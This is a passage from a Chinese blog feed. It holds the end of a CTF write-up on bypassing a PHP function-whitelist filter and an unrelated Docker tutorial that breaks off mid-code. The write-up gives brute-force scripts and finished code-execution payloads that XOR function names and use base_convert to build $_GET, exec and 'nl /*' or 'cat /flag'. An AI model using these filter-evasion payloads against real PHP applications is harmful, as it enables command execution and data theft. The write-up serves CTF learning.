class="comment">//^</span></span><br></pre></td></tr></table></figure></div></li></ul><p>异或字符串可以构造出新字符，但只用白名单的函数名的话，大多是ascii码值接近的小写字母，异或后得到的也多是ascii码值小的<u>不可见字符</u>，不够全面。</p><p>因此可以利用<code>a^b^b=a</code>这个性质，将a看作要获取的特殊字符，b为白名单函数名异或组合,靠脚本爆破出可以通过进制转换表示的<code>a^b</code></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//爆破脚本</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist1</span> = [<span class="string">&#x27;abs&#x27;</span>,<span class="string">&#x27;...&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="variable">$whitelist2</span> = [ <span class="string">&#x27;abs&#x27;</span>,<span class="string">&#x27;...&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];<span class="comment">//与whitelist1相同</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$whitelist1</span> <span class="keyword">as</span> <span class="variable">$i</span>):</span><br><span class="line">   <span class="keyword">foreach</span> (<span class="variable">$whitelist2</span> <span class="keyword">as</span> <span class="variable">$k</span>):</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$k</span>^<span class="variable">$i</span>^<span class="string">&quot; /&quot;</span>;<span class="comment">//a^b</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;   &quot;</span> . <span class="variable">$i</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$k</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">endforeach</span>;</span><br></pre></td></tr></table></figure></div><blockquote><p>输出结果说明</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16</span>   tanh exp <span class="comment">//意思是&quot; /&quot;^tanh^exp=&quot;16&quot;</span></span><br><span class="line"><span class="comment">//因此要想得到&quot; /&quot;只要</span></span><br><span class="line"><span class="title function_ invoke__">dechex</span>(<span class="number">22</span>)^tanh^exp  <span class="comment">//即&quot; /&quot;^tanh^exp^tanh^exp=&quot; /&quot;^0=&quot; /&quot;</span></span><br><span class="line"><span class="title function_ invoke__">hexdec</span>(<span class="number">10</span>)^tanh^exp<span class="comment">//也可以</span></span><br></pre></td></tr></table></figure></div><h4 id="注意⚠️"><a href="#注意⚠️" class="headerlink" title="注意⚠️"></a>注意⚠️</h4><ul><li><p>不能直接<code>16^tanh^exp</code> ，这样的16会被当作int型数据处理，使用进制转换函数可以转成string类型，同时选取的数值转成16进制不能有字母。</p></li><li><p>根据长度不一致字符串异或的运算规则，白名单中最短的是pi，因此特殊字符组合尽量不超过两个，如果一定要更长的特殊字符组合，要删除白名单中较短的函数名，不然得到的结果都是截断的，而特殊字符组合越长，白名单中可用函数名也就越少，出现纯数字结果的可能性也越低，这也是为什么这里不能直接构造<code>system(&#39;cat /flag&#39; )</code></p></li></ul></blockquote><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>一旦将特殊字符改成大写字母或与下划线的组合，输出中几乎没有纯数字结果。</p><h3 id="引入数字字符串的异或–构造下划线和大写字母组合"><a href="#引入数字字符串的异或–构造下划线和大写字母组合" class="headerlink" title="引入数字字符串的异或–构造下划线和大写字母组合"></a>引入数字字符串的异或–构造下划线和大写字母组合</h3><p>上面的异或结果可以归纳成<code>特殊字符组合^白名单函数1^白名单函数2=纯数字字符串</code>。</p><p>因此可以合理推测<code>纯数字字符串^白名单函数1^白名单函数2=特殊字符组合</code>。</p><p>纯字符串如果用<code>dechex</code>的方式转换，非常浪费payload长度，可以利用字符串拼接时类型转换的特性。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span>=(<span class="number">1</span>).(<span class="number">2</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);<span class="comment">//string(2) &quot;12&quot;</span></span><br></pre></td></tr></table></figure></div><p>爆破脚本</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;...&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">0</span>;<span class="variable">$k</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;<span class="comment">//$i $j字符串拼接得到&quot;00&quot;-&quot;99&quot;</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>由于pi的存在，构造出来的组合都是两个字符，会惊喜地发现大多数为下划线和大写字母组合。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">结果中 tanh^<span class="number">15</span>==&gt;ET is_nan^<span class="number">64</span>==&gt;_G </span><br><span class="line">因此构造 (is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>)) 正是 <span class="string">&quot;_G&quot;</span>.<span class="string">&quot;ET&quot;</span> ，即 <span class="string">&quot;_GET&quot;</span></span><br></pre></td></tr></table></figure></div><p>再根据PHP可变变量的特性</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="comment">//_GET</span></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;;<span class="comment">//$_GET[1]</span></span><br></pre></td></tr></table></figure></div><p>{}可以代替[],这样就可以通过get传参数，缩短payload长度</p></blockquote><p>$_GET[1]接收的数值会转换成字符串，因此即使拼接到了代码中也无法执行</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072214590.jpg"                      alt="1"                ><figcaption>1</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072214171.jpg"                      alt="2"                ><figcaption>2</figcaption></figure></p><p>因此需要像eval这样的函数执行字符串php代码</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="title function_ invoke__">base_convert</span>(<span class="number">42633</span>,<span class="number">19</span>,<span class="number">33</span>)(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure></div><p>也可以利用php可变函数的特性：<code>($a)[system]($_GET[1])</code> –&gt;php会将<code>$_GET[1]</code>的内容当作参数传入system函数执行。<code>$a</code>只要求是个变量，在这题的背景下可以用<code>$pi</code></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="variable">$pi</span>&#123;<span class="number">0</span>&#125;(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure></div><h2 id="0x02-payload缩短技巧"><a href="#0x02-payload缩短技巧" class="headerlink" title="0x02 payload缩短技巧"></a>0x02 payload缩短技巧</h2><h3 id="通过外部传参数"><a href="#通过外部传参数" class="headerlink" title="通过外部传参数"></a>通过外部传参数</h3><ul><li><p>使用$_GET[1]，索引选择最简短且符合题目要求的数字1，系统命令通过1传参，不占有payload</p></li><li><p>使用getallheaders获取请求头信息，将索引设成1，将获取header中key为1的value，再将这个结果传入exec函数，但这个payload较长，超过60字符</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//base_convert(696468,10,36) -&gt; exec</span></span><br><span class="line"><span class="comment">//base_convert(8768397090111664438,10,30) -&gt; getallheaders</span></span><br><span class="line"><span class="comment">//exec(getallheaders()&#123;1&#125;)</span></span><br></pre></td></tr></table></figure></div></li></ul><h3 id="穷举进制转换"><a href="#穷举进制转换" class="headerlink" title="穷举进制转换"></a>穷举进制转换</h3><p>如果要得到flag字符串，10进制转36进制需要数字为727432,有6位，而通过脚本穷举+正则匹配筛选可以发现32进制转22进制时，只需要4位数字就可以得到flag</p><p>脚本如下</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="variable">$num</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$payload</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$tmp</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$payload</span>,<span class="variable">$i</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$tmp</span>)-<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>&gt;<span class="variable">$num</span>)</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">11</span>+<span class="variable">$num</span>;<span class="variable">$i</span>&lt;=<span class="number">36</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">10</span>;<span class="variable">$j</span>&lt;=<span class="number">36</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$res</span>.= <span class="variable">$i</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$j</span> . <span class="string">&#x27; &#x27;</span> . <span class="title function_ invoke__">base_convert</span>(<span class="variable">$payload</span>, <span class="variable">$i</span>, <span class="variable">$j</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$payload</span>);<span class="variable">$i</span>&lt;<span class="number">2</span>*<span class="title function_ invoke__">strlen</span>(<span class="variable">$payload</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d&#123;2&#125;\s\d&#123;2&#125;\s\d&#123;&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;&#125;\n/&#x27;</span>,<span class="variable">$res</span>,<span class="variable">$mc</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$mc</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072214513.jpg"                      alt="image-20220809211543165"                ><figcaption>image-20220809211543165</figcaption></figure></p><blockquote><p><code>base_convert(5648,32,22)--&gt;&#39;flag&#39;</code></p></blockquote><h2 id="0x03-一些尝试"><a href="#0x03-一些尝试" class="headerlink" title="0x03 一些尝试"></a>0x03 一些尝试</h2><h3 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h3><p>上面的payload几乎都使用了花括号来访问数组，如果题目过滤了花括号，那么是否可以在保证长度尽可能小的情况下,构造无花括号payload</p><blockquote><p>PHP7.4不再能够使用花括号来访问<a class="link"   href="https://www.yuanmaluntan.com/tags-11630.html" >数组 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>或者字符串的偏移.需要将{}修改成[] （本题环境为7.3.9）</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072226764.jpg"                      alt="4"                ><figcaption>4</figcaption></figure></p><h3 id="无花括号payload"><a href="#无花括号payload" class="headerlink" title="无花括号payload"></a>无花括号payload</h3><p>由于传入的是字符串，反引号不能被识别为系统命令执行，因此使用名称较短的exec函数</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure></div><p>但是这样就不能外部传入命令来节省payload，因此要求执行的命令足够短，这里使用nl命令</p><p>linux下执行<code>nl /*</code>扫描根目录，会打印根目录下所有文件，不会目录向下递归</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072228668.jpg"                      alt="6"                ><figcaption>6</figcaption></figure></p><blockquote><p><code>nl [参数] [文件]</code></p><p>nl命令是一个很好用的编号过滤工具。该命令可以读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aff   rad2deg sin <span class="comment">//`nl</span></span><br><span class="line"><span class="number">16</span>   exp tan   <span class="comment">// /</span></span><br><span class="line"><span class="number">9</span>f   cos pi  <span class="comment">//*`</span></span><br><span class="line">  </span><br><span class="line">(<span class="title function_ invoke__">dechex</span>(<span class="number">2815</span>)^rad2deg^sin).((<span class="number">1</span>).(<span class="number">6</span>)^exp^tan).(<span class="title function_ invoke__">dechex</span>(<span class="number">159</span>)^cos^pi) <span class="comment">//`nl /*`</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ca   abs log <span class="comment">//nl</span></span><br><span class="line"><span class="number">164</span>   exp tan <span class="comment">// /*</span></span><br><span class="line">(<span class="title function_ invoke__">dechex</span>(<span class="number">202</span>)^abs^log).(<span class="title function_ invoke__">hexdec</span>(a4)^exp^tan) <span class="comment">//nl /*</span></span><br></pre></td></tr></table></figure></div><p>用上面的穷举脚本找出最适合的进制转换exec</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;34 23 22950&quot;</span>&#125;</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>) <span class="comment">//exec</span></span><br></pre></td></tr></table></figure></div><p>无花括号payload</p><p>长度:70</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>)((<span class="title function_ invoke__">dechex</span>(<span class="number">202</span>)^abs^log).((<span class="number">1</span>).(<span class="number">6</span>).(<span class="number">4</span>)^exp^tan))</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072227751.jpg"                      alt="7"                ><figcaption>7</figcaption></figure></p><p>本地php7.4以上也能成功执行(但是php8以后有个fatal error 不能使用未定义常量，直接用函数名异或的时候会识别成常量)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072229986.jpg"                      alt="9"                ><figcaption>9</figcaption></figure></p><p>不过这边尝试了下带花括号的，似乎也能成功，花括号只在php8以后才被定义为<strong>Fatal error</strong></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072227919.jpg"                      alt="11"                ><figcaption>11</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072227457.jpg"                      alt="12"                ><figcaption>12</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习</title>
      <link href="/2022/01/12/docker%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/12/docker%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="docker学习"><a href="#docker学习" class="headerlink" title="docker学习"></a>docker学习</h1><h2 id="dockerfile启动环境"><a href="#dockerfile启动环境" class="headerlink" title="dockerfile启动环境"></a>dockerfile启动环境</h2><p>事先编写好dockerfile，在其所在目录下打开终端，从dockerfile建立镜像</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t nginx:v1 . </span><br></pre></td></tr></table></figure></div><blockquote><p>-t snginx:v1 给新构建的镜像取名为nginx，并设定版本为 v1 。</p><p>⚠️不要忘记版本号后空格加一个<code>.</code> 最后的<code>.</code>代表本次执行的上下文路径</p><p>上下文路径:是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。默认上下文路径就是 Dockerfile 所在的位置a</p><p>⚠️上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p></blockquote><p>使用<code>docker images</code>命令查看镜像是否创建成功，若成功会发现有一个刚创建的nginx镜像</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY    TAG   IMAGE ID       CREATED        SIZE</span><br><span class="line">nginx         v1   3efd9464e2a0   2 hours ago    134MB</span><br></pre></td></tr></table></figure></div><p>利用该镜像启动容器，注意端口映射</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 本地端口：容器端口 镜像名称</span><br><span class="line">docker run  --name docker_nginx_v1   -d -p 127.0.0.1:5001:80 nginx:v1</span><br></pre></td></tr></table></figure></div><blockquote><p>意思是启动一个名字为docker_nginx_v1的容器，使用nginx:v1镜像，并将本机127.0.0.1:5001映射到该容器的80端口(因为nginx的默认端口是<strong>80</strong>)，因此建立成功后可以从127.0.0.1:5001访问该环境</p><p>注：</p><p>1.容器默认都是绑定 tcp 端口，如果要绑定 UDP 端口，可以在容器的端口后面加上 &#x2F;udp</p><p>2.-d:在后台运行</p><p>3.-it:交互式方式运行</p><p>4.-p:指定端口</p></blockquote><p><code>docker ps</code>查看正在运行的容器</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONTAINER ID   IMAGE      COMMAND                  CREATED         STATUS         PORTS                    NAMES</span><br><span class="line">dd0c50ae3ef8   nginx:v1   &quot;/docker-entrypoint.…&quot;   4 seconds ago   Up 3 seconds   127.0.0.1:5001-&gt;80/tcp   docker_nginx_v1</span><br></pre></td></tr></table></figure></div><p>访问127.0.0.1:5001</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1t4bxp031j20zk06u0t8.jpg"                      alt="image-20220501191611894"                ><figcaption>image-20220501191611894</figcaption></figure></p><p>dockerfile的内容</p><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27;</span> &gt; /usr/share/nginx/html/index.html</span></span><br></pre></td></tr></table></figure></div><h2 id="使用dockerfile构建镜像"><a href="#使用dockerfile构建镜像" class="headerlink" title="使用dockerfile构建镜像"></a>使用dockerfile构建镜像</h2><p>Dockerfile整体就两类语句组成：</p><ul><li># Comment 注释信息</li><li>Instruction arguments 指令 参数，一行一个指令。</li></ul><p>⚠️</p><ol><li>Dockerfile文件名<strong>首字母必须大写</strong>。</li><li>Dockerfile指令不区分大小写，但是为方便和参数做区分，通常<strong>指令使用大写字母。</strong></li><li>Dockerfile中指令按顺序从上至下依次执行。</li><li>Dockerfile中第一个非注释行必须是<strong>FROM指令</strong>，用来指定制作当前镜像依据的是哪个基础镜像。</li><li>Dockerfile中需要调用的文件必须跟Dockerfile文件在同一目录下，或者在其子目录下，父目录或者其它路径无效。</li></ol><h3 id="FROM和RUN"><a href="#FROM和RUN" class="headerlink" title="FROM和RUN"></a>FROM和RUN</h3><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p><p><strong>RUN</strong>：用于执行后面跟着的命令行命令。有以下俩种格式：</p><p>shell格式</p><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> &lt;命令行命令&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>&lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</p></blockquote><p>exec格式</p><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [<span class="string">&quot;可执行文件&quot;</span>, <span class="string">&quot;参数1&quot;</span>, <span class="string">&quot;参数2&quot;</span>]</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [<span class="string">&quot;./test.php&quot;</span>, <span class="string">&quot;dev&quot;</span>, <span class="string">&quot;offline&quot;</span>] </span></span><br><span class="line"><span class="comment"># 等价于 RUN ./test.php dev offline</span></span><br></pre></td></tr></table></figure></div><blockquote><p>如果有多条命令执行，不要分成多个RUN语句，dockerfile的指令每执行一次都会在 docker 上新建一层，过多无意义的层，会造成镜像膨胀过大</p><p>正确写法是用<code>\</code>表示分行，<code>&amp;&amp;</code>链接命令</p><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum -y install wget \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; tar -xvf redis.tar.gz</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>复制指令，可以从上下文目录中复制文件或目录到容器内指定路径</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;</span><br><span class="line">COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,...  &quot;&lt;目标路径&gt;&quot;]</span><br></pre></td></tr></table></figure></div><ul><li><p>**[–chown&#x3D;<user>:<group>]**：可选参数，用户改变复制到容器内文件的拥有者和属组</p></li><li><p>**&lt;源路径&gt;**：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pattern:</span><br><span class="line">&#123; term &#125;</span><br><span class="line">term:</span><br><span class="line">&#x27;*&#x27;                                  匹配0或多个非路径分隔符的字符</span><br><span class="line">&#x27;?&#x27;                                  匹配1个非路径分隔符的字符</span><br><span class="line">&#x27;[&#x27; [ &#x27;^&#x27; ] &#123; character-range &#125; &#x27;]&#x27;  字符组（必须非空）</span><br><span class="line">c                                    匹配字符c（c != &#x27;*&#x27;, &#x27;?&#x27;, &#x27;\\&#x27;, &#x27;[&#x27;）</span><br><span class="line">&#x27;\\&#x27; c                               匹配字符c</span><br><span class="line">character-range:</span><br><span class="line">c           匹配字符c（c != &#x27;\\&#x27;, &#x27;-&#x27;, &#x27;]&#x27;）</span><br><span class="line">&#x27;\\&#x27; c      匹配字符c</span><br><span class="line">lo &#x27;-&#x27; hi   匹配区间[lo, hi]内的字符</span><br><span 